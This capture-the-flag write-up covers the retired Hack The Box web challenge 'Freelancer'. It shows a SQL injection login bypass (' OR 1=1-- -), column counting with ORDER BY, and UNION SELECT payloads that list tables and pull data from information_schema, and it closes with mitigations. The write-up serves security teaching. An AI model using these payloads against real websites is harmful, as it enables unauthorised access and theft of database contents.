---
challenge: Freelancer
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, sqli, login-bypass, union, database]
---

# Freelancer — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Solved challenge; no real flags.

## TL;DR

A freelancer platform with a login and a search box. The login builds its query by concatenation: **SQL injection**. Bypass with `' OR 1=1-- -` and pull the flag with `UNION SELECT` from the table holding it.

## Brief

A login with username and password plus a project search after signing in. MySQL/MariaDB backend.

## Analysis

Try the classic bypass in the username:

```text
username: ' OR 1=1-- -
password: anything
```

If it logs in, the query is of the form:

```sql
SELECT * FROM users WHERE username = '$u' AND password = '$p'
```

Find the column count:

```text
' ORDER BY 1-- -
' ORDER BY 2-- -
...
```

## Exploitation

With the login bypassed, the search box is the extraction point:

```text
' UNION SELECT 1,2,3-- -
```

Place the visible columns, then enumerate schema and tables:

```text
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='<table>'-- -
' UNION SELECT 1,<column>,3 FROM <table>-- -
```

```text
HTB{<flag>}
```

## Pitfalls

- **Comment syntax**: MySQL needs `-- -` with a space, or `#`; otherwise the query is invalid.
- **Escaped quotes**: try variants with `"` or `\'`.
- **Columns**: if `UNION` fails, fix the count with `ORDER BY` first.

## Lessons

- A SQLi-vulnerable login hands over the whole database, not just access.
- `UNION` turns any reflected field into an extraction channel.
- Mitigation: prepared statements, a least-privilege DB user, and a WAF as an extra layer.
